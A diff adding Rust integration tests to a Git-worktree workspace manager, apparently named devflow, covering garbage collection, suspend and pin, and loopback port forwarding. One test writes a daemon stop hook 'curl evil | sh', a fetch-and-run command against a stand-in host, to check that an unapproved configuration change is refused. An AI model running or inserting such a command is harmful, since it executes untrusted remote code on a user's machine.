+        text.contains("--use-default-recipes") && text.contains("needs attention"),
+        "{text}"
+    );
+    let list = stdout(ok(&env.run(&["list"])));
+    assert!(list.contains("needs attention (no recipes)"), "{list}");
+    let doc = json(ok(&env.run(&["--json", "list"])));
+    let sources: Vec<(String, String)> = doc["workspaces"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|w| {
+            (
+                w["workspace"]["name"].as_str().unwrap().to_string(),
+                w["recipes"]["source"].as_str().unwrap().to_string(),
+            )
+        })
+        .collect();
+    assert!(
+        sources.iter().any(|(_, source)| source == "main"),
+        "{sources:?}"
+    );
+    assert!(
+        sources.contains(&("old".into(), "unavailable".into())),
+        "{sources:?}"
+    );
+    // Its recipes cannot be edited: there is no file, and the error offers the choice.
+    let out = env.run_in(&path, &["--json", "hooks", "add", "setup", "true"]);
+    failed(&out);
+    let doc = json(&out);
+    assert!(
+        doc["remedies"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|r| r["kind"] == "use_default_recipes"),
+        "{doc}"
+    );
+
+    // The flag makes the choice non-interactively and records it.
+    let out = env.run_in(
+        &path,
+        &[
+            "--json",
+            "--non-interactive",
+            "setup",
+            "--use-default-recipes",
+        ],
+    );
+    ok(&out);
+    let doc = json(&out);
+    assert_eq!(doc["status"], "ready", "{doc}");
+    assert_eq!(doc["recipes"]["source"], "default_chosen", "{doc}");
+    assert_eq!(doc["recipes"]["choice"], "recorded", "{doc}");
+    assert!(
+        doc["receipt"]["default_recipes"]["because"].is_string(),
+        "{doc}"
+    );
+    // Its recipes now come from the default workspace's file, which is the one edited.
+    let doc = json(ok(&env.run_in(&path, &["--json", "hooks", "list"])));
+    assert_eq!(doc["files"]["recipes"]["source"], "default_chosen", "{doc}");
+    assert_eq!(
+        doc["files"]["project"]["path"],
+        env.config_path().to_str().unwrap(),
+        "{doc}"
+    );
+    // The choice is remembered; a plain setup stays ready.
+    let doc = json(ok(
+        &env.run_in(&path, &["--json", "--non-interactive", "setup"])
+    ));
+    assert_eq!(doc["status"], "ready", "{doc}");
+
+    // The branch gains a valid file of its own: it applies, and the choice is cleared.
+    std::fs::copy(env.config_path(), path.join("devflow.toml")).unwrap();
+    let doc = json(ok(
+        &env.run_in(&path, &["--json", "--non-interactive", "setup"])
+    ));
+    assert_eq!(doc["recipes"]["source"], "workspace", "{doc}");
+    assert_eq!(doc["recipes"]["choice"], "cleared", "{doc}");
+    assert!(doc["receipt"].get("default_recipes").is_none(), "{doc}");
 }
 
 #[test]
@@ -3883,19 +4802,21 @@ fn pitchfork_status_reports_install_version_supervisor_and_proxy() {
         "{doc}"
     );
 
-    // Missing features are named.
+    // A release older than the pin is named, typed, in the document.
     std::fs::remove_file(fake.dir.join("version_exit")).unwrap();
-    fake.set("missing", "proxy status --json\n");
+    fake.set("version", "2.14.0");
     let doc = json(ok(&status(&["--json", "pitchfork", "status"])));
     assert_eq!(doc["usable"], false, "{doc}");
     assert_eq!(
-        doc["pitchfork"]["missing_features"],
-        json!(["proxy status --json"]),
+        doc["pitchfork"]["unsupported"],
+        json!({"tool": "pitchfork", "reason": "too_old", "found": "2.14.0", "minimum": "2.20.0"}),
         "{doc}"
     );
+    let text = stdout(ok(&status(&["pitchfork", "status"])));
+    assert!(text.contains("older than 2.20.0"), "{text}");
 
     // The human form.
-    std::fs::remove_file(fake.dir.join("missing")).unwrap();
+    std::fs::remove_file(fake.dir.join("version")).unwrap();
     fake.set("supervisor_down", "1");
     let text = stdout(ok(&status(&["pitchfork", "status"])));
     for needle in [
@@ -6757,6 +7678,131 @@ fn gc_finds_what_a_host_left_behind_and_removes_only_what_is_named() {
     );
 }
 
+/// A repository restored to the same path (a backup, a migration) keeps every
+/// path and has other directories: the records it holds are not its own until
+/// the person says so, and saying so removes nothing.
+#[test]
+fn gc_leaves_a_record_restored_to_the_same_path_alone_until_the_person_binds_it() {
+    let env = Env::new();
+    let fake = env.fake_pitchfork();
+    let (path, namespace) = env.workspace_with_daemon(&fake);
+    fake.set(
+        "after_start.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
+    );
+    ok(&env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]));
+    removed_by_a_host(&env, &path);
+    fake.set(
+        "list.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "stopped", None)])).unwrap(),
+    );
+
+    // The record is another directory's: same path, another identity.
+    let records = env.repo.join(".git/devflow/workspaces");
+    let file = std::fs::read_dir(&records)
+        .unwrap()
+        .filter_map(Result::ok)
+        .map(|e| e.path())
+        .find(|p| p.extension().is_some_and(|e| e == "json"))
+        .expect("the record");
+    let mut record: Value = serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
+    record["checkout"]["identity"] = json!("12345:678");
+    std::fs::write(&file, serde_json::to_vec_pretty(&record).unwrap()).unwrap();
+
+    let doc = json(ok(&env.run_fake(&fake, &env.repo, &["--json", "gc"])));
+    let entry = doc["inventory"]["entries"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|e| e["workspace"] == "feature/p")
+        .unwrap_or_else(|| panic!("{doc}"))
+        .clone();
+    assert_eq!(entry["class"], "unknown", "{doc}");
+    assert_eq!(entry["cause"]["cause"], "other_checkout", "{doc}");
+    assert_eq!(entry["removable"], false, "{doc}");
+    let short = entry["instance"].as_str().unwrap()[..8].to_string();
+    let remedy = entry["remedies"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|r| r["kind"] == "rebind_record")
+        .unwrap_or_else(|| panic!("{doc}"))
+        .clone();
+    assert_eq!(remedy["destructive"], true, "{doc}");
+    assert_eq!(
+        remedy["command"],
+        format!("devflow gc --rebind {short}"),
+        "{doc}"
+    );
+    let text = stdout(ok(&env.run_fake(&fake, &env.repo, &["gc"])));
+    assert!(
+        text.contains("copied or restored") && text.contains("--rebind"),
+        "{text}"
+    );
+
+    // Naming it for removal does nothing, forced or not.
+    let out = env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "gc", "--remove", &short, "--yes", "--force"],
+    );
+    failed(&out);
+    let doc = json(&out);
+    assert_eq!(doc["removed"], json!([]));
+    assert_eq!(
+        doc["not_removable"][0]["remedies"][0]["kind"], "rebind_record",
+        "the refusal says the way on: {doc}"
+    );
+    assert!(file.is_file(), "the record is untouched");
+    let out = env.run_fake(&fake, &env.repo, &["gc", "--remove", &short, "--yes"]);
+    failed(&out);
+    assert!(
+        stderr(&out).contains(&format!("devflow gc --rebind {short}")),
+        "{}",
+        describe(&out)
+    );
+
+    // Binding needs the person's word in a script, and takes only an id.
+    let doc = json(ok(&env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "gc", "--rebind", &short],
+    )));
+    assert_eq!(doc["confirmed"], false, "{doc}");
+    assert_eq!(doc["rebound"], json!([]), "{doc}");
+    failed(&env.run(&["--json", "gc", "--remove", &short, "--rebind", &short]));
+    failed(&env.run(&["--json", "gc", "--rebind", "deadbeef", "--yes"]));
+    let before: Value = serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
+    assert_eq!(before["checkout"]["identity"], "12345:678");
+
+    let doc = json(ok(&env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "gc", "--rebind", &short, "--yes"],
+    )));
+    assert_eq!(doc["confirmed"], true, "{doc}");
+    assert_eq!(doc["rebound"][0]["workspace"], "feature/p", "{doc}");
+    assert_eq!(doc["rebound"][0]["class"], "removed_elsewhere", "{doc}");
+    assert!(file.is_file(), "binding removes nothing");
+    // Nothing is left to bind.
+    let out = env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "gc", "--rebind", &short, "--yes"],
+    );
+    failed(&out);
+    assert_eq!(json(&out)["rebound"], json!([]));
+
+    // Now it is cleaned up like any other.
+    let doc = json(ok(&env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "gc", "--remove", &short, "--yes"],
+    )));
+    assert_eq!(doc["removed"][0]["workspace"], "feature/p", "{doc}");
+    assert!(!file.exists(), "the record is gone");
+}
+
 #[test]
 fn gc_never_removes_an_active_workspace_even_when_it_is_named() {
     let env = Env::new();
@@ -6898,4 +7944,652 @@ fn the_wide_listing_says_unknown_when_pitchfork_could_not_be_asked() {
         .unwrap();
     assert!(item["wide"].get("daemons_unobserved").is_none(), "{item}");
     assert_eq!(item["wide"]["daemons"][0]["state"], "not started", "{item}");
+}
+
+// --- suspend, pin and focus -------------------------------------------------
+
+/// The Git directory and receipt of the workspace `name`.
+fn receipt_of(env: &Env, name: &str) -> (PathBuf, Receipt) {
+    let doc = json(&env.run(&["--json", "list"]));
+    let item = doc["workspaces"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|w| w["workspace"]["name"] == name)
+        .unwrap()
+        .clone();
+    let git_dir = PathBuf::from(item["workspace"]["git_dir"].as_str().unwrap());
+    let receipt = Receipt::load(&git_dir).unwrap().unwrap();
+    (git_dir, receipt)
+}
+
+/// Make the workspace look unused for `days`.
+fn idle_for(env: &Env, name: &str, days: i64) {
+    let (git_dir, mut receipt) = receipt_of(env, name);
+    receipt.last_active_at = Some(chrono::Utc::now() - chrono::Duration::days(days));
+    receipt.save(&git_dir).unwrap();
+}
+
+#[test]
+fn suspend_records_the_rest_and_switching_resumes() {
+    let env = Env::new();
+    env.init();
+    workspace(&env, "feature/a");
+
+    let out = env.run(&["--json", "suspend", "feature/a"]);
+    ok(&out);
+    let doc = json(&out);
+    assert_eq!(doc["ok"], true, "{doc}");
+    assert_eq!(doc["workspaces"][0]["suspended"], true, "{doc}");
+    assert!(doc["workspaces"][0]["suspended_at"].is_string(), "{doc}");
+    assert!(receipt_of(&env, "feature/a").1.suspended_at.is_some());
+
+    // Both listings carry it; the wide table marks it.
+    let doc = json(&env.run(&["--json", "list", "--wide"]));
+    let item = doc["workspaces"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|w| w["workspace"]["name"] == "feature/a")
+        .unwrap();
+    assert!(item["wide"]["suspended_at"].is_string(), "{item}");
+    let human = stdout(&env.run(&["list", "--wide"]));
+    let line = human.lines().find(|l| l.contains("feature/a")).unwrap();
+    assert!(line.contains("[suspended]"), "{human}");
+
+    // Suspending again converges and keeps the first time.
+    let first = receipt_of(&env, "feature/a").1.suspended_at;
+    ok(&env.run(&["suspend", "feature/a"]));
+    assert_eq!(receipt_of(&env, "feature/a").1.suspended_at, first);
+
+    // Entering the workspace resumes it.
+    let out = env.run(&["--json", "--non-interactive", "switch", "feature/a"]);
+    ok(&out);
+    assert!(json(&out)["resumed_from"].is_string());
+    assert!(receipt_of(&env, "feature/a").1.suspended_at.is_none());
+
+    // So does `resume`, which does not change directory.
+    ok(&env.run(&["suspend", "feature/a"]));
+    let out = env.run(&["--json", "--non-interactive", "resume", "feature/a"]);
+    ok(&out);
+    let doc = json(&out);
+    assert_eq!(doc["command"], "resume", "{doc}");
+    assert!(doc["resumed_from"].is_string(), "{doc}");
+    assert!(receipt_of(&env, "feature/a").1.suspended_at.is_none());
+
+    // A workspace that does not exist is an error.
+    failed(&env.run(&["--json", "suspend", "nowhere"]));
+}
+
+#[test]
+fn pins_keep_a_workspace_out_of_idle_suspension() {
+    let env = Env::new();
+    env.init();
+    let _a = workspace(&env, "feature/a");
+    let _b = workspace(&env, "feature/b");
+    let c = workspace(&env, "feature/c");
+    for name in ["feature/a", "feature/b", "feature/c"] {
+        idle_for(&env, name, 10);
+    }
+
+    let out = env.run(&["--json", "pin", "feature/b"]);
+    ok(&out);
+    assert_eq!(json(&out)["changed"], true);
+    assert!(receipt_of(&env, "feature/b").1.pinned);
+    assert_eq!(
+        json(&env.run(&["--json", "pin", "feature/b"]))["changed"],
+        false
+    );
+    let human = stdout(&env.run(&["list", "--wide"]));
+    assert!(
+        human
+            .lines()
+            .find(|l| l.contains("feature/b"))
+            .unwrap()
+            .contains("[pinned]"),
+        "{human}"
+    );
+
+    // A command run in `feature/c` is activity too.
+    ok(&env.run_in(&c, &["exec", "--", "true"]));
+    assert!(c.join(".devflow/active").is_file());
+
+    // Without confirmation nothing happens, and the selection is named.
+    let out = env.run(&["--json", "--non-interactive", "suspend", "--idle", "3d"]);
+    failed(&out);
+    assert!(
+        stdout(&out).contains("feature/a") || stderr(&out).contains("feature/a"),
+        "{}",
+        describe(&out)
+    );
+    assert!(receipt_of(&env, "feature/a").1.suspended_at.is_none());
+
+    let out = env.run(&["--json", "suspend", "--idle", "3d", "--yes"]);
+    ok(&out);
+    let doc = json(&out);
+    let suspended: Vec<&str> = doc["workspaces"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|w| w["workspace"].as_str().unwrap())
+        .collect();
+    assert_eq!(suspended, ["feature/a"], "{doc}");
+    let skipped = |name: &str| {
+        doc["skipped"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|s| s["workspace"] == name)
+            .map(|s| s["reason"].as_str().unwrap().to_string())
+    };
+    assert_eq!(skipped("feature/b").as_deref(), Some("pinned"), "{doc}");
+    assert_eq!(
+        skipped("feature/c"),
+        None,
+        "touched by exec, so not idle: {doc}"
+    );
+    // The main checkout is never selected.
+    assert!(
+        doc["skipped"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|s| s["reason"] == "default"),
+        "{doc}"
+    );
+    assert!(receipt_of(&env, "feature/b").1.suspended_at.is_none());
+
+    // Unpinned, it is selectable again.
+    ok(&env.run(&["unpin", "feature/b"]));
+    assert!(!receipt_of(&env, "feature/b").1.pinned);
+    let doc = json(&env.run(&["--json", "suspend", "--idle", "3d", "--yes"]));
+    assert_eq!(doc["workspaces"][0]["workspace"], "feature/b", "{doc}");
+}
+
+/// A listener on a loopback port (ephemeral by default) answering every
+/// connection with `name`.
+fn greeter(name: &'static str, port: Option<u16>) -> u16 {
+    use std::io::Write;
+    let listener = std::net::TcpListener::bind(("127.0.0.1", port.unwrap_or(0))).unwrap();
+    let port = listener.local_addr().unwrap().port();
+    std::thread::spawn(move || {
+        for stream in listener.incoming().flatten() {
+            let mut stream = stream;
+            let _ = stream.write_all(name.as_bytes());
+        }
+    });
+    port
+}
+
+fn greeting(port: u16) -> String {
+    use std::io::Read;
+    let mut stream = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
+    stream
+        .set_read_timeout(Some(std::time::Duration::from_secs(5)))
+        .unwrap();
+    let mut text = String::new();
+    let _ = stream.read_to_string(&mut text);
+    text
+}
+
+fn free_port() -> u16 {
+    std::net::TcpListener::bind(("127.0.0.1", 0))
+        .unwrap()
+        .local_addr()
+        .unwrap()
+        .port()
+}
+
+/// Ends the forwarder whatever the test does.
+struct StopFocus<'a>(&'a Env);
+
+impl Drop for StopFocus<'_> {
+    fn drop(&mut self) {
+        let _ = self.0.run(&["focus", "--stop"]);
+    }
+}
+
+#[test]
+fn focus_forwards_a_canonical_port_to_the_workspace_in_use() {
+    let env = Env::new();
+    env.init();
+    workspace(&env, "feature/a");
+    workspace(&env, "feature/b");
+    let _stop = StopFocus(&env);
+    let port_of = |name: &str| receipt_of(&env, name).1.app_port.unwrap();
+    greeter("a", Some(port_of("feature/a")));
+    greeter("b", Some(port_of("feature/b")));
+    let canonical = free_port();
+    let canonical_arg = canonical.to_string();
+
+    // Off until asked for.
+    let doc = json(&env.run(&["--json", "focus"]));
+    assert_eq!(doc["focus"]["running"], false, "{doc}");
+
+    let out = env.run(&["--json", "focus", "feature/a", "--port", &canonical_arg]);
+    ok(&out);
+    let doc = json(&out);
+    assert_eq!(doc["focus"]["running"], true, "{doc}");
+    assert_eq!(doc["focus"]["workspace"]["name"], "feature/a", "{doc}");
+    assert_eq!(greeting(canonical), "a");
+
+    // Re-pointing keeps the port (no --port) and moves the target.
+    ok(&env.run(&["focus", "feature/b"]));
+    assert_eq!(greeting(canonical), "b");
+    let doc = json(&env.run(&["--json", "focus"]));
+    assert_eq!(doc["focus"]["workspace"]["name"], "feature/b", "{doc}");
+    assert_eq!(
+        doc["focus"]["forwards"][0]["to"],
+        port_of("feature/b"),
+        "{doc}"
+    );
+    assert_eq!(doc["focus"]["forwards"][0]["reachable"], true, "{doc}");
+    let human = stdout(&env.run(&["focus"]));
+    assert!(
+        human.contains("feature/b") && human.contains(&canonical_arg),
+        "{human}"
+    );
+
+    // Switching workspaces never moves it.
+    ok(&env.run(&["--non-interactive", "switch", "feature/a"]));
+    assert_eq!(greeting(canonical), "b");
+
+    ok(&env.run(&["focus", "--stop"]));
+    assert!(std::net::TcpStream::connect(("127.0.0.1", canonical)).is_err());
+    let doc = json(&env.run(&["--json", "focus"]));
+    assert_eq!(doc["focus"]["running"], false, "{doc}");
+}
+
+#[test]
+fn focus_names_a_port_that_is_taken_and_refuses_what_it_cannot_forward() {
+    let env = Env::new();
+    env.init();
+    workspace(&env, "feature/a");
+    let _stop = StopFocus(&env);
+    let taken = std::net::TcpListener::bind(("127.0.0.1", 0)).unwrap();
+    let port = taken.local_addr().unwrap().port().to_string();
+
+    let out = env.run(&["--json", "focus", "feature/a", "--port", &port]);
+    failed(&out);
+    let message = json(&out)["error"].as_str().unwrap().to_string();
+    assert!(
+        message.contains(&port) && message.contains("already in use"),
+        "{message}"
+    );
+    // Nothing was started.
+    assert_eq!(
+        json(&env.run(&["--json", "focus"]))["focus"]["running"],
+        false
+    );
+
+    // No port named and none configured.
+    let out = env.run(&["--json", "focus", "feature/a"]);
+    failed(&out);
+    assert!(
+        json(&out)["error"]
+            .as_str()
+            .unwrap()
+            .contains("focus_ports")
+    );
+
+    // Ports below 1024 would need privileges; a daemon that is not there.
+    failed(&env.run(&["focus", "feature/a", "--port", "80"]));
+    let free = free_port().to_string();
+    failed(&env.run(&[
+        "--json",
+        "focus",
+        "feature/a",
+        "--port",
+        &format!("{free}=web"),
+    ]));
+}
+
+#[test]
+fn removing_a_workspace_ends_the_focus_that_pointed_at_it_and_only_then() {
+    let env = Env::new();
+    env.init();
+    workspace(&env, "feature/a");
+    workspace(&env, "feature/b");
+    let _stop = StopFocus(&env);
+    let port_of = |name: &str| receipt_of(&env, name).1.app_port.unwrap();
+    greeter("a", Some(port_of("feature/a")));
+    greeter("b", Some(port_of("feature/b")));
+    let canonical = free_port();
+    let canonical_arg = canonical.to_string();
+
+    // The focus is on `a`; removing `b` leaves it alone.
+    ok(&env.run(&["focus", "feature/a", "--port", &canonical_arg]));
+    let out = env.run(&["--json", "remove", "feature/b"]);
+    ok(&out);
+    assert!(json(&out).get("released_focus").is_none());
+    assert_eq!(greeting(canonical), "a");
+    assert_eq!(
+        json(&env.run(&["--json", "focus"]))["focus"]["running"],
+        true
+    );
+
+    // Removing `a` takes every forward to it with it, and the result says so.
+    let out = env.run(&["--json", "remove", "feature/a"]);
+    ok(&out);
+    let doc = json(&out);
+    assert_eq!(doc["released_focus"]["workspace"], "feature/a", "{doc}");
+    assert_eq!(doc["released_focus"]["ports"], json!([canonical]), "{doc}");
+    assert_eq!(doc["released_focus"]["stopped"], true, "{doc}");
+    assert!(std::net::TcpStream::connect(("127.0.0.1", canonical)).is_err());
+    assert_eq!(
+        json(&env.run(&["--json", "focus"]))["focus"]["running"],
+        false
+    );
+
+    // The human output says it too.
+    workspace(&env, "feature/c");
+    ok(&env.run(&["focus", "feature/c", "--port", &canonical_arg]));
+    let text = stdout(ok(&env.run(&["remove", "feature/c"])));
+    assert!(text.contains("ended the focus on feature/c"), "{text}");
+}
+
+#[test]
+fn a_clean_up_ends_the_focus_on_a_workspace_a_host_removed() {
+    let env = Env::new();
+    let fake = env.fake_pitchfork();
+    let (path, namespace) = env.workspace_with_daemon(&fake);
+    let _stop = StopFocus(&env);
+    let port = receipt_in(&path).app_port.unwrap();
+    greeter("p", Some(port));
+    let canonical = free_port();
+    ok(&env.run(&["focus", "feature/p", "--port", &canonical.to_string()]));
+    assert_eq!(greeting(canonical), "p");
+    fake.set(
+        "after_start.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
+    );
+    ok(&env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]));
+    removed_by_a_host(&env, &path);
+    // Git lost the worktree; the forwarder, which only knows a port, still
+    // forwards to it.
+    assert_eq!(greeting(canonical), "p");
+
+    fake.set(
+        "list.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "stopped", None)])).unwrap(),
+    );
+    let doc = json(ok(&env.run_fake(&fake, &env.repo, &["--json", "gc"])));
+    let instance = doc["inventory"]["entries"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|e| e["workspace"] == "feature/p")
+        .unwrap()["instance"]
+        .as_str()
+        .unwrap()
+        .to_string();
+    let doc = json(ok(&env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "gc", "--remove", &instance[..8], "--yes"],
+    )));
+    assert_eq!(doc["removed"][0]["workspace"], "feature/p", "{doc}");
+    assert_eq!(
+        doc["removed"][0]["released_focus"]["ports"],
+        json!([canonical]),
+        "{doc}"
+    );
+    assert!(std::net::TcpStream::connect(("127.0.0.1", canonical)).is_err());
+    assert_eq!(
+        json(&env.run(&["--json", "focus"]))["focus"]["running"],
+        false
+    );
+}
+
+/// The receipt of the workspace at `path`.
+fn receipt_in(path: &Path) -> Receipt {
+    let git_dir = std::fs::read_to_string(path.join(".git")).unwrap();
+    let git_dir = PathBuf::from(git_dir.trim().strip_prefix("gitdir: ").unwrap());
+    Receipt::load(&git_dir).unwrap().unwrap()
+}
+
+#[test]
+fn a_clean_up_of_a_registered_workspace_whose_directory_is_gone_ends_its_focus() {
+    let env = Env::new();
+    let fake = env.fake_pitchfork();
+    let (path, namespace) = env.workspace_with_daemon(&fake);
+    let _stop = StopFocus(&env);
+    greeter("p", Some(receipt_in(&path).app_port.unwrap()));
+    let canonical = free_port();
+    ok(&env.run(&["focus", "feature/p", "--port", &canonical.to_string()]));
+    assert_eq!(greeting(canonical), "p");
+    fake.set(
+        "after_start.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
+    );
+    ok(&env.run_fake(&fake, &path, &["--json", "--non-interactive", "up"]));
+    // The directory is deleted; Git still has the worktree registered.
+    std::fs::remove_dir_all(&path).unwrap();
+    fake.set(
+        "list.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "stopped", None)])).unwrap(),
+    );
+    let doc = json(ok(&env.run_fake(&fake, &env.repo, &["--json", "gc"])));
+    let entry = doc["inventory"]["entries"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|e| e["workspace"] == "feature/p")
+        .unwrap_or_else(|| panic!("{doc}"))
+        .clone();
+    assert_eq!(entry["class"], "missing", "{doc}");
+    let instance = entry["instance"].as_str().unwrap().to_string();
+    let doc = json(ok(&env.run_fake(
+        &fake,
+        &env.repo,
+        &["--json", "gc", "--remove", &instance[..8], "--yes"],
+    )));
+    assert_eq!(doc["removed"][0]["workspace"], "feature/p", "{doc}");
+    assert_eq!(
+        doc["removed"][0]["released_focus"]["ports"],
+        json!([canonical]),
+        "{doc}"
+    );
+    assert!(std::net::TcpStream::connect(("127.0.0.1", canonical)).is_err());
+}
+
+#[test]
+fn focus_ports_are_the_main_checkouts_whichever_workspace_asks() {
+    let env = Env::new();
+    env.init();
+    let canonical = free_port();
+    let text = std::fs::read_to_string(env.config_path()).unwrap();
+    assert!(text.contains("[worktree]\n"), "{text}");
+    std::fs::write(
+        env.config_path(),
+        text.replacen(
+            "[worktree]\n",
+            &format!("[worktree]\nfocus_ports = [{canonical}]\n"),
+            1,
+        ),
+    )
+    .unwrap();
+    let a = workspace(&env, "feature/a");
+    // The workspace's own checkout does not say it: its copy of devflow.toml
+    // (when it has one) is about recipes, and this key is shared.
+    let _stop = StopFocus(&env);
+    greeter("a", Some(receipt_of(&env, "feature/a").1.app_port.unwrap()));
+    ok(&env.run_in(&a, &["focus", "feature/a"]));
+    assert_eq!(greeting(canonical), "a");
+    let doc = json(&env.run_in(&a, &["--json", "focus"]));
+    assert_eq!(doc["focus"]["forwards"][0]["listen"], canonical, "{doc}");
+}
+
+/// The focus directory of the project (what the forwarder keeps).
+fn focus_dir(env: &Env) -> PathBuf {
+    let doc = json(&env.run(&["--json", "list"]));
+    let id = doc["project"]["id"].as_str().unwrap().replace('-', "");
+    env.root.join("data").join("focus").join(id)
+}
+
+#[test]
+fn a_forwarder_that_cannot_be_seen_to_stop_keeps_the_removal_from_freeing_the_port() {
+    let env = Env::new();
+    env.init();
+    let a = workspace(&env, "feature/a");
+    let (_, receipt) = receipt_of(&env, "feature/a");
+    let port = receipt.app_port.unwrap();
+
+    // A forwarder that holds its lock and never answers, pointed at `a`.
+    let dir = focus_dir(&env);
+    std::fs::create_dir_all(&dir).unwrap();
+    let lock = std::fs::OpenOptions::new()
+        .create(true)
+        .truncate(false)
+        .write(true)
+        .open(dir.join("forwarder.lock"))
+        .unwrap();
+    lock.try_lock().unwrap();
+    std::fs::write(
+        dir.join("state.json"),
+        serde_json::to_vec(&json!({
+            "pid": std::process::id(), "started_at": "2026-01-01T00:00:00Z", "applied": 1,
+            "workspace": {"name": "feature/a", "path": a, "instance": receipt.instance_id},
+            "mappings": [{"listen": 43999, "target": {"kind": "app"}, "to": port}],
+        }))
+        .unwrap(),
+    )
+    .unwrap();
+
+    let out = env.run(&["--json", "remove", "feature/a"]);
+    failed(&out);
+    let doc = json(&out);
+    assert!(
+        doc["error"].as_str().unwrap().contains("focus"),
+        "the refusal says why: {doc}"
+    );
+    // Nothing was deleted and the port is still reserved for it.
+    assert!(a.is_dir());
+    let ledger = std::fs::read_to_string(env.root.join("data/ports/ledger.json")).unwrap();
+    assert!(ledger.contains(&port.to_string()), "{ledger}");
+    assert_eq!(receipt_of(&env, "feature/a").1.app_port, Some(port));
+
+    // Once nothing holds the forwarder's lock, the removal goes through.
+    drop(lock);
+    std::fs::remove_file(dir.join("state.json")).unwrap();
+    ok(&env.run(&["--json", "remove", "feature/a"]));
+}
+
+#[test]
+fn a_workspace_that_is_being_removed_is_not_published_as_the_focus() {
+    let env = Env::new();
+    env.init();
+    workspace(&env, "feature/a");
+    let _stop = StopFocus(&env);
+    let (_, receipt) = receipt_of(&env, "feature/a");
+    // The removal marked its record before it ended any focus.
+    devflow_core::ledger::Handle::new(&env.repo.join(".git"), receipt.instance_id)
+        .begin(None)
+        .unwrap();
+    let canonical = free_port().to_string();
+    let out = env.run(&["--json", "focus", "feature/a", "--port", &canonical]);
+    failed(&out);
+    assert!(
+        json(&out)["error"]
+            .as_str()
+            .unwrap()
+            .contains("being removed"),
+        "{}",
+        describe(&out)
+    );
+    assert_eq!(
+        json(&env.run(&["--json", "focus"]))["focus"]["running"],
+        false
+    );
+}
+
+#[test]
+fn giving_a_workspace_a_new_identity_ends_the_focus_on_the_old_one() {
+    let env = Env::new();
+    env.init();
+    let a = workspace(&env, "feature/a");
+    let _stop = StopFocus(&env);
+    greeter("a", Some(receipt_of(&env, "feature/a").1.app_port.unwrap()));
+    let canonical = free_port();
+    ok(&env.run(&["focus", "feature/a", "--port", &canonical.to_string()]));
+    assert_eq!(greeting(canonical), "a");
+    let before = receipt_of(&env, "feature/a").1.instance_id;
+
+    ok(&env.run_in(&a, &["--non-interactive", "setup", "--new-instance"]));
+    assert_ne!(receipt_of(&env, "feature/a").1.instance_id, before);
+    assert!(std::net::TcpStream::connect(("127.0.0.1", canonical)).is_err());
+    assert_eq!(
+        json(&env.run(&["--json", "focus"]))["focus"]["running"],
+        false
+    );
+}
+
+#[test]
+fn a_refused_suspension_keeps_what_was_done_and_carries_the_failure_envelope() {
+    let env = Env::new();
+    let fake = env.fake_pitchfork();
+    let (path, namespace) = env.workspace_with_daemon(&fake);
+    fake.set(
+        "list.json",
+        &serde_json::to_string(&json!([daemon(&namespace, "running", Some(4242))])).unwrap(),
+    );
+    // The configuration changed after it was approved: pitchfork would run the
+    // new `on_stop`, so the stop is refused.
+    std::fs::write(
+        path.join("pitchfork.toml"),
+        "[daemons.web]\nrun = \"x\"\n[daemons.web.hooks]\non_stop = \"curl evil | sh\"\n",
+    )
+    .unwrap();
+    let out = env.run_fake(&fake, &env.repo, &["--json", "suspend", "feature/p"]);
+    failed(&out);
+    let doc = json(&out);
+    assert_eq!(doc["command"], "suspend", "{doc}");
+    assert!(
+        doc["error"].as_str().unwrap().contains("feature/p"),
+        "{doc}"
+    );
+    assert!(
+        doc["remedies"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|r| r["kind"] == "trust"),
+        "{doc}"
+    );
+    assert!(doc["hint"].is_string(), "{doc}");
+    // The partial results are still there, beside the error.
+    assert_eq!(doc["ok"], false, "{doc}");
+    assert_eq!(doc["workspaces"][0]["suspended"], false, "{doc}");
+    assert!(doc["workspaces"][0]["problem"].is_string(), "{doc}");
+    assert!(fake.mutations().iter().all(|m| !m.starts_with("stop")));
+}
+
+#[test]
+fn publishing_a_focus_waits_behind_the_workspaces_process_lock() {
+    let env = Env::new();
+    env.init();
+    workspace(&env, "feature/a");
+    let _stop = StopFocus(&env);
+    let (git_dir, _) = receipt_of(&env, "feature/a");
+    // A removal or a replacement of the identity holds this lock while it ends
+    // the focus: a focus published meanwhile would outlive it, so it is not
+    // published until the lock is free.
+    let busy = Receipt::try_process_lock(&git_dir).unwrap().unwrap();
+    let canonical = free_port().to_string();
+    let out = env.run(&["--json", "focus", "feature/a", "--port", &canonical]);
+    failed(&out);
+    assert!(
+        json(&out)["error"]
+            .as_str()
+            .unwrap()
+            .contains("another devflow operation"),
+        "{}",
+        describe(&out)
+    );
+    assert_eq!(
+        json(&env.run(&["--json", "focus"]))["focus"]["running"],
+        false
+    );
+    drop(busy);
+    ok(&env.run(&["focus", "feature/a", "--port", &canonical]));
 }
